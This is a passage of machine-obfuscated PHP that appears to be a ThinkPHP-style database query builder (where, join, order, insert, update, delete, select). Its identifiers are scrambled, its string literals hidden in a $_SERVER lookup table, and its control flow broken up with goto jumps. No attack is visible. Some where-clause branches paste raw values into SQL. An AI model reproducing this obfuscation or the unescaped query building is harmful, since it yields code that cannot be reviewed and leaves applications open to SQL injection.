($D œÄÛÚ§ as $E¢™«ÎÉÇ => $C¾›œ“Š²ƒ) { if (!is_numeric($E¢™«ÎÉÇ)) { $F«–ğ¼÷æ[] = $this->parseKey($E¢™«ÎÉÇ, !1) . $cŒÖ°¡™„Ä[933] . $this->parseKey($C¾›œ“Š²ƒ); } else { $F«–ğ¼÷æ[] = $this->parseKey($C¾›œ“Š²ƒ); } } $FÉ’Õİê­ = implode($cŒÖ°¡™„Ä[47], $F«–ğ¼÷æ); } elseif (is_string($D œÄÛÚ§) && !empty($D œÄÛÚ§)) { $FÉ’Õİê­ = $D œÄÛÚ§; } else { $FÉ’Õİê­ = $cŒÖ°¡™„Ä[181]; } return $FÉ’Õİê­; } protected function parseTable($eé§·˜¨˜) { $eÌÚÜ»„­Ã =& $_SERVER[µ…]; if (is_array($eé§·˜¨˜)) { $D¯ƒÇ³ì‡¥ = array(); foreach ($eé§·˜¨˜ as $Dê ÃÌ¶êÎ => $DÓ‚ìÉºßİ) { if (!is_numeric($Dê ÃÌ¶êÎ)) { $D¯ƒÇ³ì‡¥[] = $this->parseKey($Dê ÃÌ¶êÎ) . $eÌÚÜ»„­Ã[50] . $this->parseKey($DÓ‚ìÉºßİ); } else { $D¯ƒÇ³ì‡¥[] = $this->parseKey($Dê ÃÌ¶êÎ); } } $eé§·˜¨˜ = $D¯ƒÇ³ì‡¥; } elseif (is_string($eé§·˜¨˜)) { if (strstr($eé§·˜¨˜, $eÌÚÜ»„­Ã[50])) { return $eé§·˜¨˜; } $eé§·˜¨˜ = explode($eÌÚÜ»„­Ã[47], $eé§·˜¨˜); array_walk($eé§·˜¨˜, array($this, $eÌÚÜ»„­Ã[844])); } return $eÌÚÜ»„­Ã[838] . trim(implode($eÌÚÜ»„­Ã[934], $eé§·˜¨˜), $eÌÚÜ»„­Ã[380]) . $eÌÚÜ»„­Ã[838]; } protected function parseWhere($c†ÆˆÇº©) { $f“àÀŒœ =& $_SERVER[µ…]; $d…ÜÒ†ë½Š = $f“àÀŒœ[33]; if (is_string($c†ÆˆÇº©)) { $d…ÜÒ†ë½Š = $c†ÆˆÇº©; } else { $BÎÏ”³ôÜ“ = isset($c†ÆˆÇº©[$f“àÀŒœ[935]]) ? strtoupper($c†ÆˆÇº©[$f“àÀŒœ[935]]) : $f“àÀŒœ[33]; if (in_array($BÎÏ”³ôÜ“, array($f“àÀŒœ[936], $f“àÀŒœ[937], $f“àÀŒœ[938]))) { $BÎÏ”³ôÜ“ = $f“àÀŒœ[50] . $BÎÏ”³ôÜ“ . $f“àÀŒœ[50]; unset($c†ÆˆÇº©[$f“àÀŒœ[935]]); } else { $BÎÏ”³ôÜ“ = $f“àÀŒœ[939]; } foreach ($c†ÆˆÇº© as $c•Ø¨¿‰Ù => $aÀ¾«¦²…¨) { $d…ÜÒ†ë½Š .= $f“àÀŒœ[273]; if (is_numeric($c•Ø¨¿‰Ù)) { $c•Ø¨¿‰Ù = $f“àÀŒœ[940]; } if (0 === strpos($c•Ø¨¿‰Ù, $f“àÀŒœ[70])) { $d…ÜÒ†ë½Š .= $this->parseThinkWhere($c•Ø¨¿‰Ù, $aÀ¾«¦²…¨); } else { if (!preg_match($f“àÀŒœ[941], trim($c•Ø¨¿‰Ù))) { think_exception(think_lang($f“àÀŒœ[942]) . $f“àÀŒœ[4] . $c•Ø¨¿‰Ù); } $F¯ëß‰”¸‚ = is_array($aÀ¾«¦²…¨) && isset($aÀ¾«¦²…¨[$f“àÀŒœ[943]]); $c•Ø¨¿‰Ù = trim($c•Ø¨¿‰Ù); if (strpos($c•Ø¨¿‰Ù, $f“àÀŒœ[279])) { $B®µ£ö°„ = explode($f“àÀŒœ[279], $c•Ø¨¿‰Ù); $bŠñŞ¾¾³ã = array(); foreach ($B®µ£ö°„ as $F²éÏ±ø“­ => $F¼ô¦Ë) { $Dó¢¿Âã = $F¯ëß‰”¸‚ ? $aÀ¾«¦²…¨[$F²éÏ±ø“­] : $aÀ¾«¦²…¨; $bŠñŞ¾¾³ã[] = $f“àÀŒœ[256] . $this->parseWhereItem($this->parseKey($F¼ô¦Ë), $Dó¢¿Âã) . $f“àÀŒœ[843]; } $d…ÜÒ†ë½Š .= implode($f“àÀŒœ[944], $bŠñŞ¾¾³ã); } elseif (strpos($c•Ø¨¿‰Ù, $f“àÀŒœ[280])) { $B®µ£ö°„ = explode($f“àÀŒœ[280], $c•Ø¨¿‰Ù); $bŠñŞ¾¾³ã = array(); foreach ($B®µ£ö°„ as $F²éÏ±ø“­ => $F¼ô¦Ë) { $Dó¢¿Âã = $F¯ëß‰”¸‚ ? $aÀ¾«¦²…¨[$F²éÏ±ø“­] : $aÀ¾«¦²…¨; $bŠñŞ¾¾³ã[] = $f“àÀŒœ[256] . $this->parseWhereItem($this->parseKey($F¼ô¦Ë), $Dó¢¿Âã) . $f“àÀŒœ[843]; } $d…ÜÒ†ë½Š .= implode($f“àÀŒœ[939], $bŠñŞ¾¾³ã); } else { $d…ÜÒ†ë½Š .= $this->parseWhereItem($this->parseKey($c•Ø¨¿‰Ù), $aÀ¾«¦²…¨); } } $d…ÜÒ†ë½Š .= $f“àÀŒœ[274] . $BÎÏ”³ôÜ“; } $d…ÜÒ†ë½Š = substr($d…ÜÒ†ë½Š, 0, -strlen($BÎÏ”³ôÜ“)); } return empty($d…ÜÒ†ë½Š) ? $f“àÀŒœ[33] : $f“àÀŒœ[945] . $d…ÜÒ†ë½Š; } protected function parseWhereItem($b¹¥å˜ª®Ê, $d¸Ú´†Ÿß™) { $F´ø½é–êø =& $_SERVER[µ…]; $cä»é«ÈİÙ = $F´ø½é–êø[33]; if (is_array($d¸Ú´†Ÿß™)) { if (is_string($d¸Ú´†Ÿß™[0])) { $cŒ­æ¶Ö‘ = strtolower($d¸Ú´†Ÿß™[0]); if (in_array($d¸Ú´†Ÿß™[0], array($F´ø½é–êø[929], $F´ø½é–êø[946], $F´ø½é–êø[947], $F´ø½é–êø[948], $F´ø½é–êø[949], $F´ø½é–êø[950]))) { $cä»é«ÈİÙ .= $b¹¥å˜ª®Ê . $F´ø½é–êø[50] . $d¸Ú´†Ÿß™[0] . $F´ø½é–êø[50] . $this->parseValue($d¸Ú´†Ÿß™[1]); } elseif (preg_match($F´ø½é–êø[951], $d¸Ú´†Ÿß™[0])) { $cä»é«ÈİÙ .= $b¹¥å˜ª®Ê . $F´ø½é–êø[50] . $this->exp[$cŒ­æ¶Ö‘] . $F´ø½é–êø[50] . $this->parseValue($d¸Ú´†Ÿß™[1]); } elseif (preg_match($F´ø½é–êø[952], $d¸Ú´†Ÿß™[0])) { if (is_array($d¸Ú´†Ÿß™[1])) { $d•ŸÊğ¶ó¹ = isset($d¸Ú´†Ÿß™[2]) ? strtoupper($d¸Ú´†Ÿß™[2]) : $F´ø½é–êø[937]; if (in_array($d•ŸÊğ¶ó¹, array($F´ø½é–êø[936], $F´ø½é–êø[937], $F´ø½é–êø[938]))) { $aéÅ„ËÖˆÙ = array(); foreach ($d¸Ú´†Ÿß™[1] as $A„ƒõÑ½¦±) { $aéÅ„ËÖˆÙ[] = $b¹¥å˜ª®Ê . $F´ø½é–êø[50] . $this->exp[$cŒ­æ¶Ö‘] . $F´ø½é–êø[50] . $this->parseValue($A„ƒõÑ½¦±); } $cä»é«ÈİÙ .= $F´ø½é–êø[256] . implode($F´ø½é–êø[50] . $d•ŸÊğ¶ó¹ . $F´ø½é–êø[50], $aéÅ„ËÖˆÙ) . $F´ø½é–êø[843]; } } else { $cä»é«ÈİÙ .= $b¹¥å˜ª®Ê . $F´ø½é–êø[50] . $this->exp[$cŒ­æ¶Ö‘] . $F´ø½é–êø[50] . $this->parseValue($d¸Ú´†Ÿß™[1]); } } elseif ($F´ø½é–êø[293] == $cŒ­æ¶Ö‘) { $cä»é«ÈİÙ .= $F´ø½é–êø[841] . $b¹¥å˜ª®Ê . $F´ø½é–êø[50] . $d¸Ú´†Ÿß™[1] . $F´ø½é–êø[953]; } elseif (preg_match($F´ø½é–êø[954], $d¸Ú´†Ÿß™[0])) { $cä»é«ÈİÙ .= $d¸Ú´†Ÿß™[0]; } elseif (preg_match($F´ø½é–êø[955], $d¸Ú´†Ÿß™[0])) { if (isset($d¸Ú´†Ÿß™[2]) && $F´ø½é–êø[293] == $d¸Ú´†Ÿß™[2]) { $cä»é«ÈİÙ .= $b¹¥å˜ª®Ê . $F´ø½é–êø[50] . $this->exp[$cŒ­æ¶Ö‘] . $F´ø½é–êø[50] . $d¸Ú´†Ÿß™[1]; } else { if (is_string($d¸Ú´†Ÿß™[1])) { $d¸Ú´†Ÿß™[1] = explode($F´ø½é–êø[47], $d¸Ú´†Ÿß™[1]); } $Eœ½½¸ØßÃ = implode($F´ø½é–êø[47], $this->parseValue($d¸Ú´†Ÿß™[1])); $cä»é«ÈİÙ .= $b¹¥å˜ª®Ê . $F´ø½é–êø[50] . $this->exp[$cŒ­æ¶Ö‘] . $F´ø½é–êø[841] . $Eœ½½¸ØßÃ . $F´ø½é–êø[843]; } } elseif (preg_match($F´ø½é–êø[956], $d¸Ú´†Ÿß™[0])) { $dÂÆ“·Ì¼© = is_string($d¸Ú´†Ÿß™[1]) ? explode($F´ø½é–êø[47], $d¸Ú´†Ÿß™[1]) : $d¸Ú´†Ÿß™[1]; $cä»é«ÈİÙ .= $F´ø½é–êø[841] . $b¹¥å˜ª®Ê . $F´ø½é–êø[50] . $this->exp[$cŒ­æ¶Ö‘] . $F´ø½é–êø[50] . $this->parseValue($dÂÆ“·Ì¼©[0]) . $F´ø½é–êø[939] . $this->parseValue($dÂÆ“·Ì¼©[1]) . $F´ø½é–êø[274]; } else { think_exception(think_lang($F´ø½é–êø[942]) . $F´ø½é–êø[4] . $d¸Ú´†Ÿß™[0]); } } else { $cÖË·ƒø„ = count($d¸Ú´†Ÿß™); $BŸŒŸ®½ª = $F´ø½é–êø[33]; if (is_string($d¸Ú´†Ÿß™[$cÖË·ƒø„ - 1])) { $BŸŒŸ®½ª = isset($d¸Ú´†Ÿß™[$cÖË·ƒø„ - 1]) ? strtoupper($d¸Ú´†Ÿß™[$cÖË·ƒø„ - 1]) : $F´ø½é–êø[33]; if (in_array($BŸŒŸ®½ª, array($F´ø½é–êø[936], $F´ø½é–êø[937], $F´ø½é–êø[938]))) { $cÖË·ƒø„ = $cÖË·ƒø„ - 1; } } else { $BŸŒŸ®½ª = $F´ø½é–êø[936]; } for ($fà¿Úë·ÔÛ = 0; $fà¿Úë·ÔÛ < $cÖË·ƒø„; $fà¿Úë·ÔÛ++) { $dÂÆ“·Ì¼© = is_array($d¸Ú´†Ÿß™[$fà¿Úë·ÔÛ]) ? $d¸Ú´†Ÿß™[$fà¿Úë·ÔÛ][1] : $d¸Ú´†Ÿß™[$fà¿Úë·ÔÛ]; if ($F´ø½é–êø[293] == strtolower($d¸Ú´†Ÿß™[$fà¿Úë·ÔÛ][0])) { $cä»é«ÈİÙ .= $F´ø½é–êø[256] . $b¹¥å˜ª®Ê . $F´ø½é–êø[50] . $dÂÆ“·Ì¼© . $F´ø½é–êø[953] . $BŸŒŸ®½ª . $F´ø½é–êø[50]; } else { $EÏ¨éŸ¿Êë = is_array($d¸Ú´†Ÿß™[$fà¿Úë·ÔÛ]) ? $this->exp[strtolower($d¸Ú´†Ÿß™[$fà¿Úë·ÔÛ][0])] : $F´ø½é–êø[929]; if (!$EÏ¨éŸ¿Êë && is_array($d¸Ú´†Ÿß™[$fà¿Úë·ÔÛ]) && in_array($d¸Ú´†Ÿß™[$fà¿Úë·ÔÛ][0], array($F´ø½é–êø[929], $F´ø½é–êø[946], $F´ø½é–êø[947], $F´ø½é–êø[948], $F´ø½é–êø[949], $F´ø½é–êø[950]))) { $EÏ¨éŸ¿Êë = $d¸Ú´†Ÿß™[$fà¿Úë·ÔÛ][0]; } $cä»é«ÈİÙ .= $F´ø½é–êø[256] . $b¹¥å˜ª®Ê . $F´ø½é–êø[50] . $EÏ¨éŸ¿Êë . $F´ø½é–êø[50] . $this->parseValue($dÂÆ“·Ì¼©) . $F´ø½é–êø[953] . $BŸŒŸ®½ª . $F´ø½é–êø[50]; } } $cä»é«ÈİÙ = substr($cä»é«ÈİÙ, 0, -4); } } else { $cä»é«ÈİÙ .= $b¹¥å˜ª®Ê . $F´ø½é–êø[957] . $this->parseValue($d¸Ú´†Ÿß™); } return $cä»é«ÈİÙ; } protected function parseThinkWhere($c±¡ÑªÇã‰, $aŒ×¡Ù£Í) { $fÑóáŠÉÀ =& $_SERVER[µ…]; $E¼±Èµ‡¦ = $fÑóáŠÉÀ[33]; switch ($c±¡ÑªÇã‰) { case $fÑóáŠÉÀ[348]: $E¼±Èµ‡¦ = $aŒ×¡Ù£Í; break; case $fÑóáŠÉÀ[940]: $E¼±Èµ‡¦ = is_string($aŒ×¡Ù£Í) ? $aŒ×¡Ù£Í : substr($this->parseWhere($aŒ×¡Ù£Í), 6); break; case $fÑóáŠÉÀ[958]: parse_str($aŒ×¡Ù£Í, $eùèÕˆ‰»–); if (isset($eùèÕˆ‰»–[$fÑóáŠÉÀ[935]])) { $BÆœƒœÍ÷é = $fÑóáŠÉÀ[50] . strtoupper($eùèÕˆ‰»–[$fÑóáŠÉÀ[935]]) . $fÑóáŠÉÀ[50]; unset($eùèÕˆ‰»–[$fÑóáŠÉÀ[935]]); } else { $BÆœƒœÍ÷é = $fÑóáŠÉÀ[939]; } $cÂùÛŸáó— = array(); foreach ($eùèÕˆ‰»– as $bÆ¥Ú»İµƒ => $EÙ®¶åÑ¯) { $cÂùÛŸáó—[] = $this->parseKey($bÆ¥Ú»İµƒ) . $fÑóáŠÉÀ[957] . $this->parseValue($EÙ®¶åÑ¯); } $E¼±Èµ‡¦ = implode($BÆœƒœÍ÷é, $cÂùÛŸáó—); break; } return $E¼±Èµ‡¦; } protected function parseLimit($a†–åÉƒ) { $eé¢¦­è¹­ =& $_SERVER[µ…]; return !empty($a†–åÉƒ) ? $eé¢¦­è¹­[48] . $a†–åÉƒ . $eé¢¦­è¹­[50] : $eé¢¦­è¹­[33]; } protected function parseJoin($bøí›’©Ï) { $e†¡ùÎò¹ =& $_SERVER[µ…]; $cÈ÷‘øæ¡æ = $e†¡ùÎò¹[33]; if (!empty($bøí›’©Ï)) { if (is_array($bøí›’©Ï)) { foreach ($bøí›’©Ï as $d‹Ôå‰Óô => $e°„Ÿäíß¸) { if (!1 !== stripos($e°„Ÿäíß¸, $e†¡ùÎò¹[959])) { $cÈ÷‘øæ¡æ .= $e†¡ùÎò¹[50] . $e°„Ÿäíß¸; } else { $cÈ÷‘øæ¡æ .= $e†¡ùÎò¹[960] . $e°„Ÿäíß¸; } } } else { $cÈ÷‘øæ¡æ .= $e†¡ùÎò¹[960] . $bøí›’©Ï; } } $cÈ÷‘øæ¡æ = preg_replace($e†¡ùÎò¹[961], think_config($e†¡ùÎò¹[867]) . $e†¡ùÎò¹[962], $cÈ÷‘øæ¡æ); return $cÈ÷‘øæ¡æ; } protected function parseOrder($CâÈùçÅÌİ) { $a÷ïÃĞçÈÚ =& $_SERVER[µ…]; if (is_array($CâÈùçÅÌİ)) { $Eœ°ò³Û¨¾ = array(); foreach ($CâÈùçÅÌİ as $dÉĞğèŸ => $cªœÀŸ´™) { if (is_numeric($dÉĞğèŸ)) { $Eœ°ò³Û¨¾[] = $this->parseKey($cªœÀŸ´™); } else { $cªœÀŸ´™ = in_array(strtoupper(trim($cªœÀŸ´™)), array($a÷ïÃĞçÈÚ[963], $a÷ïÃĞçÈÚ[964])) ? $a÷ïÃĞçÈÚ[50] . $cªœÀŸ´™ : $a÷ïÃĞçÈÚ[33]; if (preg_match($a÷ïÃĞçÈÚ[965], $dÉĞğèŸ)) { $Eœ°ò³Û¨¾[] = $this->parseKey($dÉĞğèŸ) . $cªœÀŸ´™; } else { think_exception($a÷ïÃĞçÈÚ[966] . $dÉĞğèŸ); } } } $CâÈùçÅÌİ = implode($a÷ïÃĞçÈÚ[47], $Eœ°ò³Û¨¾); } return !empty($CâÈùçÅÌİ) ? $a÷ïÃĞçÈÚ[967] . $CâÈùçÅÌİ : $a÷ïÃĞçÈÚ[33]; } protected function parseGroup($d­Şó±á—‚) { $C£Å´µäŒ† =& $_SERVER[µ…]; return !empty($d­Şó±á—‚) ? $C£Å´µäŒ†[968] . $d­Şó±á—‚ : $C£Å´µäŒ†[33]; } protected function parseHaving($e›í¶©µø¡) { $D´¨›´ÀŠ‘ =& $_SERVER[µ…]; return !empty($e›í¶©µø¡) ? $D´¨›´ÀŠ‘[969] . $e›í¶©µø¡ : $D´¨›´ÀŠ‘[33]; } protected function parseComment($a˜ˆ°¨ë) { $dö™ö¯²Š =& $_SERVER[µ…]; return !empty($a˜ˆ°¨ë) ? $dö™ö¯²Š[970] . $a˜ˆ°¨ë . $dö™ö¯²Š[971] : $dö™ö¯²Š[33]; } protected function parseDistinct($dìßŠ£™é°) { $DäßÎ¥¨Ô =& $_SERVER[µ…]; return !empty($dìßŠ£™é°) ? $DäßÎ¥¨Ô[972] : $DäßÎ¥¨Ô[33]; } protected function parseUnion($CµáççĞ¾ï) { $dÅé¿šªê =& $_SERVER[µ…]; if (empty($CµáççĞ¾ï)) { return $dÅé¿šªê[33]; } if (isset($CµáççĞ¾ï[$dÅé¿šªê[344]])) { $fÌà›íÇ× = $dÅé¿šªê[973]; unset($CµáççĞ¾ï[$dÅé¿šªê[344]]); } else { $fÌà›íÇ× = $dÅé¿šªê[974]; } foreach ($CµáççĞ¾ï as $B²Ó©ªøàÛ) { $BÉµçŠ¢ƒ„[] = $fÌà›íÇ× . (is_array($B²Ó©ªøàÛ) ? $this->buildSelectSql($B²Ó©ªøàÛ) : $B²Ó©ªøàÛ); } return implode($dÅé¿šªê[50], $BÉµçŠ¢ƒ„); } public function insert($Bé½š¡ĞÆ , $F¬˜†Ş¡Â¬ = array(), $b‹–Û•öŞš = false) { goto D¤äÎÄäÇ; e´ï·¶›Èì: $BÎÍØä±—“ .= $this->parseComment(!empty($F¬˜†Ş¡Â¬[$d‰œÜà¥½¤[350]]) ? $F¬˜†Ş¡Â¬[$d‰œÜà¥½¤[350]] : $d‰œÜà¥½¤[33]); return $this->execute($BÎÍØä±—“, $this->parseBind(!empty($F¬˜†Ş¡Â¬[$d‰œÜà¥½¤[281]]) ? $F¬˜†Ş¡Â¬[$d‰œÜà¥½¤[281]] : array())); goto b­—•í®‡É; D¤äÎÄäÇ: $d‰œÜà¥½¤ =& $_SERVER[µ…]; $e·Åò¸ËÒø = $C±ëîÄÛˆ = array(); $this->model = $F¬˜†Ş¡Â¬[$d‰œÜà¥½¤[277]]; goto CŸ±È¥ä±; CŸ±È¥ä±: foreach ($Bé½š¡ĞÆ  as $BìÛ³•¾¸¤ => $FÉÍ„Ë‚Õ) { if (is_array($FÉÍ„Ë‚Õ) && $d‰œÜà¥½¤[293] == $FÉÍ„Ë‚Õ[0]) { $C±ëîÄÛˆ[] = $this->parseKey($BìÛ³•¾¸¤); $e·Åò¸ËÒø[] = $FÉÍ„Ë‚Õ[1]; } elseif (is_scalar($FÉÍ„Ë‚Õ) || is_null($FÉÍ„Ë‚Õ)) { $C±ëîÄÛˆ[] = $this->parseKey($BìÛ³•¾¸¤); $e·Åò¸ËÒø[] = $this->parseValue($FÉÍ„Ë‚Õ); } } $BÎÍØä±—“ = ($b‹–Û•öŞš ? $d‰œÜà¥½¤[845] : $d‰œÜà¥½¤[846]) . $d‰œÜà¥½¤[847] . $this->parseTable($F¬˜†Ş¡Â¬[$d‰œÜà¥½¤[275]]) . $d‰œÜà¥½¤[841] . implode($d‰œÜà¥½¤[47], $C±ëîÄÛˆ) . $d‰œÜà¥½¤[842] . implode($d‰œÜà¥½¤[47], $e·Åò¸ËÒø) . $d‰œÜà¥½¤[843]; $BÎÍØä±—“ .= $this->parseLock(isset($F¬˜†Ş¡Â¬[$d‰œÜà¥½¤[791]]) ? $F¬˜†Ş¡Â¬[$d‰œÜà¥½¤[791]] : !1); goto e´ï·¶›Èì; b­—•í®‡É: } public function selectInsert($DÆ‡Ø« Ú, $CÊ¨«“æò‰, $eµÒÌ‰È’ç = array()) { goto cõ«ä‹§¨Õ; cõ«ä‹§¨Õ: $A¾´œËÅï´ =& $_SERVER[µ…]; $this->model = $eµÒÌ‰È’ç[$A¾´œËÅï´[277]]; if (is_string($DÆ‡Ø« Ú)) { $DÆ‡Ø« Ú = explode($A¾´œËÅï´[47], $DÆ‡Ø« Ú); } goto C²êßõÄ„; C²êßõÄ„: array_walk($DÆ‡Ø« Ú, array($this, $A¾´œËÅï´[844])); $EÀ—µÉŒóô = $A¾´œËÅï´[975] . $this->parseTable($CÊ¨«“æò‰) . $A¾´œËÅï´[841] . implode($A¾´œËÅï´[47], $DÆ‡Ø« Ú) . $A¾´œËÅï´[953]; $EÀ—µÉŒóô .= $this->buildSelectSql($eµÒÌ‰È’ç); goto cö¬ÌÆöœ; cö¬ÌÆöœ: return $this->execute($EÀ—µÉŒóô, $this->parseBind(!empty($eµÒÌ‰È’ç[$A¾´œËÅï´[281]]) ? $eµÒÌ‰È’ç[$A¾´œËÅï´[281]] : array())); goto EÕæˆòÒ¢œ; EÕæˆòÒ¢œ: } public function update($fƒ•â¤“¯Ø, $BçŠ¦¹«) { $aíˆ²›Ä¸ô =& $_SERVER[µ…]; $this->model = $BçŠ¦¹«[$aíˆ²›Ä¸ô[277]]; $C¿•ß–Üš = $aíˆ²›Ä¸ô[976] . $this->parseTable($BçŠ¦¹«[$aíˆ²›Ä¸ô[275]]) . $this->parseSet($fƒ•â¤“¯Ø) . $this->parseWhere(!empty($BçŠ¦¹«[$aíˆ²›Ä¸ô[271]]) ? $BçŠ¦¹«[$aíˆ²›Ä¸ô[271]] : $aíˆ²›Ä¸ô[33]) . $this->parseOrder(!empty($BçŠ¦¹«[$aíˆ²›Ä¸ô[361]]) ? $BçŠ¦¹«[$aíˆ²›Ä¸ô[361]] : $aíˆ²›Ä¸ô[33]) . $this->parseLimit(!empty($BçŠ¦¹«[$aíˆ²›Ä¸ô[288]]) ? $BçŠ¦¹«[$aíˆ²›Ä¸ô[288]] : $aíˆ²›Ä¸ô[33]) . $this->parseLock(isset($BçŠ¦¹«[$aíˆ²›Ä¸ô[791]]) ? $BçŠ¦¹«[$aíˆ²›Ä¸ô[791]] : !1) . $this->parseComment(!empty($BçŠ¦¹«[$aíˆ²›Ä¸ô[350]]) ? $BçŠ¦¹«[$aíˆ²›Ä¸ô[350]] : $aíˆ²›Ä¸ô[33]); return $this->execute($C¿•ß–Üš, $this->parseBind(!empty($BçŠ¦¹«[$aíˆ²›Ä¸ô[281]]) ? $BçŠ¦¹«[$aíˆ²›Ä¸ô[281]] : array())); } public function delete($A“¿‰¶Ó = array()) { $C§”ìâÚõ =& $_SERVER[µ…]; $this->model = $A“¿‰¶Ó[$C§”ìâÚõ[277]]; $DÕÅŸª‡´¥ = $C§”ìâÚõ[977] . $this->parseTable($A“¿‰¶Ó[$C§”ìâÚõ[275]]) . $this->parseWhere(!empty($A“¿‰¶Ó[$C§”ìâÚõ[271]]) ? $A“¿‰¶Ó[$C§”ìâÚõ[271]] : $C§”ìâÚõ[33]) . $this->parseOrder(!empty($A“¿‰¶Ó[$C§”ìâÚõ[361]]) ? $A“¿‰¶Ó[$C§”ìâÚõ[361]] : $C§”ìâÚõ[33]) . $this->parseLimit(!empty($A“¿‰¶Ó[$C§”ìâÚõ[288]]) ? $A“¿‰¶Ó[$C§”ìâÚõ[288]] : $C§”ìâÚõ[33]) . $this->parseLock(isset($A“¿‰¶Ó[$C§”ìâÚõ[791]]) ? $A“¿‰¶Ó[$C§”ìâÚõ[791]] : !1) . $this->parseComment(!empty($A“¿‰¶Ó[$C§”ìâÚõ[350]]) ? $A“¿‰¶Ó[$C§”ìâÚõ[350]] : $C§”ìâÚõ[33]); return $this->execute($DÕÅŸª‡´¥, $this->parseBind(!empty($A“¿‰¶Ó[$C§”ìâÚõ[281]]) ? $A“¿‰¶Ó[$C§”ìâÚõ[281]] : array())); } public function select($f¶ŠÙÈâ÷Ø = array()) { goto Dñ’¢î£åŒ; C« ¦ƒ‹Ë™: if ($Dì½ÊÓæ¤Ş && !1 !== $A‰ø©óÊÀ‚) { think_cache($B£ñ¹‹ÓŸ , $A‰ø©óÊÀ‚, $Dì½ÊÓæ¤Ş); } return $A‰ø©óÊÀ‚; goto aÅÃÔŸ‘“; b¯šô‹¹å¿: $Dì½ÊÓæ¤Ş = isset($f¶ŠÙÈâ÷Ø[$d”‡ñÑùÂ[345]]) ? $f¶ŠÙÈâ÷Ø[$d”‡ñÑùÂ[345]] : !1; if ($Dì½ÊÓæ¤Ş) { $B£ñ¹‹ÓŸ  = is_string($Dì½ÊÓæ¤Ş[$d”‡ñÑùÂ[92]]) ? $Dì½ÊÓæ¤Ş[$d”‡ñÑùÂ[92]] : $d”‡ñÑùÂ[978] . md5($DäÛ¸é¶¸); $Fê‘©÷Â Ê = think_cache($B£ñ¹‹ÓŸ , $d”‡ñÑùÂ[33], $Dì½ÊÓæ¤Ş); if (!1 !== $Fê‘©÷Â Ê) { return $Fê‘©÷Â Ê; } } $A‰ø©óÊÀ‚ = $this->query($DäÛ¸é¶¸, $this->parseBind(!empty($f¶ŠÙÈâ÷Ø[$d”‡ñÑùÂ[281]]) ? $f¶ŠÙÈâ÷Ø[$d”‡ñÑùÂ[281]] : array())); goto C« ¦ƒ‹Ë™; Dñ’¢î£åŒ: $d”‡ñÑùÂ =& $_SERVER[µ…]; $this->model = $f¶ŠÙÈâ÷Ø[$d”‡ñÑùÂ[277]]; $DäÛ¸é¶¸ = $this->buildSelectSql($f¶ŠÙÈâ÷Ø); goto b¯šô‹¹å¿; aÅÃÔŸ‘“: } public function buildSelectSql($Dõ‰ñ˜Ì = array()) { goto còÈ …Ñõ; fÍ·”â™: $e‹Õ¡†ìğ = $this->parseSql($this->selectSql, $Dõ‰ñ˜Ì); $e‹Õ¡†ìğ .= $this->parseLock(isset($Dõ‰ñ˜Ì[$Dª­¬õõóÅ[791]]) ? $Dõ‰ñ˜Ì[$Dª­¬õõóÅ[791]] : !1); if (isset($DÇÊî†ØĞ )) { think_cache($DÇÊî†ØĞ , $e‹Õ¡†ìğ); } goto aË‡¥øåÛÀ; còÈ …Ñõ: $Dª­¬õõóÅ =& $_SERVER[µ…]; if (isset($Dõ‰ñ˜Ì[$Dª­¬õõóÅ[349]])) { if (strpos($Dõ‰ñ˜Ì[$Dª­¬õõóÅ[349]], $Dª­¬õõóÅ[47])) { list($F‡øµ–…Ñ–, $Eå²ÖÑ›É) = explode($Dª­¬õõóÅ[47], $Dõ‰ñ˜Ì[$Dª­¬õõóÅ[349]]); } else { $F‡øµ–…Ñ– = $Dõ‰ñ˜Ì[$Dª­¬õõóÅ[349]]; } $F‡øµ–…Ñ– = $F‡øµ–…Ñ– ? $F‡øµ–…Ñ– : 1; $Eå²ÖÑ›É = isset($Eå²ÖÑ›É) ? $Eå²ÖÑ›É : (is_numeric($Dõ‰ñ˜Ì[$Dª­¬õõóÅ[288]]) ? $Dõ‰ñ˜Ì[$Dª­¬õõóÅ[288]] : 20); $Aó·¤ùòİ = $Eå²ÖÑ›É * ((int) $F‡øµ–…Ñ– - 1); $Dõ‰ñ˜Ì[$Dª­¬õõóÅ[288]] = $Aó·¤ùòİ . $Dª­¬õõóÅ[47] . $Eå²ÖÑ›É; } if (think_config($Dª­¬õõóÅ[979])) { $DÇÊî†ØĞ  = $Dª­¬õõóÅ[980] . md5(serialize($Dõ‰ñ˜Ì)); $bÀ³Ä®ê¦‡ = think_cache($DÇÊî†ØĞ ); if ($bÀ³Ä®ê¦‡) { return $bÀ³Ä®ê¦‡; } } goto fÍ·”â™; aË‡¥øåÛÀ: return $e‹Õ¡†ìğ; goto dˆÒ¶âƒ¢; dˆÒ¶âƒ¢: } public function parseSql($f¿î¼È°Û, $E•šâ§Øˆ« = array()) { $d³™ó‡¤íˆ =& $_SERVER[µ…]; $f¿î¼È°Û = str_replace(array($d³™ó‡¤íˆ[981], $d³™ó‡¤íˆ[982], $d³™ó‡¤íˆ[983], $d³™ó‡¤íˆ[984], $d³™ó‡¤íˆ[985], $d³™ó‡¤íˆ[986], $d³™ó‡¤íˆ[987], $d³™ó‡¤íˆ[988], $d³™ó‡¤íˆ[989], $d³™ó‡¤íˆ[990], $d³™ó‡¤íˆ[991]), array($this->parseTable("{$E•šâ§Øˆ«[$d³™ó‡¤íˆ[275]]}"), $this->parseDistinct(isset($E•šâ§Øˆ«[$d³™ó‡¤íˆ[992]]) ? $E•šâ§Øˆ«[$d³™ó‡¤íˆ[992]] : !1), $this->parseField(!empty($E•šâ§Øˆ«[$d³™ó‡¤íˆ[269]]) ? $E•šâ§Øˆ«[$d³™ó‡¤íˆ[269]] : $d³™ó‡¤íˆ[181]), $this->parseJoin(!empty($E•šâ§Øˆ«[$d³™ó‡¤íˆ[278]]) ? $E•šâ§Øˆ«[$d³™ó‡¤íˆ[278]] : $d³™ó‡¤íˆ[33]), $this->parseWhere(!empty($E•šâ§Øˆ«[$d³™ó‡¤íˆ[271]]) ? $E•šâ§Øˆ«[$d³™ó‡¤íˆ[271]] : $d³™ó‡¤íˆ[33]), $this->parseGroup(!empty($E•šâ§Øˆ«[$d³™ó‡¤íˆ[993]]) ? $E•šâ§Øˆ«[$d³™ó‡¤íˆ[993]] : $d³™ó‡¤íˆ[33]), $this->parseHaving(!empty($E•šâ§Øˆ«[$d³™ó‡¤íˆ[994]]) ? $E•šâ§Øˆ«[$d³™ó‡¤íˆ[994]] : $d³™ó‡¤íˆ[33]), $this->parseOrder(!empty($E•šâ§Øˆ«[$d³™ó‡¤íˆ[361]]) ? 